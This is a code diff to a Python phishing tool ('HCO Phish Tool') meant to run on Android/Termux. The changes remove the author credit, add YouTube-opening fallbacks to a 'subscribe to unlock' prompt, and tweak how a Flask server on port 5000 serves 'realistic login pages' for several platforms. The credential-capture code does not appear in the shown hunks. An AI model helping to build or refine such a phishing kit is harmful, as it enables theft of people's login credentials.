@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-HCO Phish Tool by Azhar
+HCO Phish Tool
 For educational purposes only
 """
 
@@ -488,16 +488,55 @@ def print_banner():
     print(f"{colors.RED}Tool locked 🔐 To unlock subscribe our YouTube channel{colors.END}")
     print()
 
+def open_youtube():
+    """Open YouTube using Termux API or direct intent"""
+    try:
+        # Try using Termux API to open YouTube app
+        result = subprocess.run(['termux-open-url', 'https://www.youtube.com'], 
+                              capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            return True
+    except:
+        pass
+    
+    try:
+        # Try using am (Android activity manager)
+        result = subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', 
+                               '-d', 'https://www.youtube.com'], 
+                              capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            return True
+    except:
+        pass
+    
+    try:
+        # Try using webbrowser as fallback
+        webbrowser.open('https://www.youtube.com')
+        return True
+    except:
+        pass
+    
+    return False
+
 def countdown():
-    for i in range(10, 0, -1):
-        print(f"{colors.RED}Redirecting to YouTube in: {colors.YELLOW}{i}{colors.END}")
+    print(f"{colors.RED}Redirecting to YouTube in:{colors.END}")
+    for i in range(5, 0, -1):
+        print(f"{colors.YELLOW}{i}{colors.END}")
         time.sleep(1)
         if i > 1:
+            # Move cursor up one line and clear line
             sys.stdout.write("\033[F\033[K")
     
     print(f"{colors.GREEN}Opening YouTube...{colors.END}")
-    webbrowser.open("https://www.youtube.com")
-    time.sleep(2)
+    
+    # Try to open YouTube
+    if open_youtube():
+        print(f"{colors.GREEN}YouTube should open shortly...{colors.END}")
+    else:
+        print(f"{colors.RED}Could not open YouTube automatically.{colors.END}")
+        print(f"{colors.YELLOW}Please manually open: https://www.youtube.com{colors.END}")
+    
+    time.sleep(3)
     
     print(f"{colors.CYAN}Welcome back! Tool unlocked.{colors.END}")
     time.sleep(1)
@@ -515,11 +554,14 @@ def countdown():
         platform = PLATFORMS[choice]
         ip = get_ip()
         print(f"\n{colors.BLUE}Selected: {platform['name']}{colors.END}")
-        print(f"{colors.YELLOW}Cloudflare Link: http://{ip}:5000{platform['path']}{colors.END}")
+        print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
         print(f"{colors.GREEN}Open this URL on another device{colors.END}")
         print(f"{colors.WHITE}Or press Enter to open in browser...{colors.END}")
         input()
-        webbrowser.open(f"http://{ip}:5000{platform['path']}")
+        try:
+            webbrowser.open(f"http://{ip}:5000{platform['path']}")
+        except:
+            print(f"{colors.YELLOW}Please manually open: http://{ip}:5000{platform['path']}{colors.END}")
     else:
         print(f"{colors.RED}Invalid option!{colors.END}")
 
@@ -538,7 +580,17 @@ def run_flask():
     ip = get_ip()
     print(f"{colors.BLUE}\nWeb server starting on http://{ip}:5000{colors.END}")
     print(f"{colors.CYAN}Realistic login pages are ready for all platforms{colors.END}")
-    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+    
+    # Disable Flask development server warning
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    
+    # Run Flask without all the verbose output
+    from werkzeug.serving import WSGIRequestHandler
+    WSGIRequestHandler.protocol_version = "HTTP/1.1"
+    
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
 
 def main():
     print_banner()
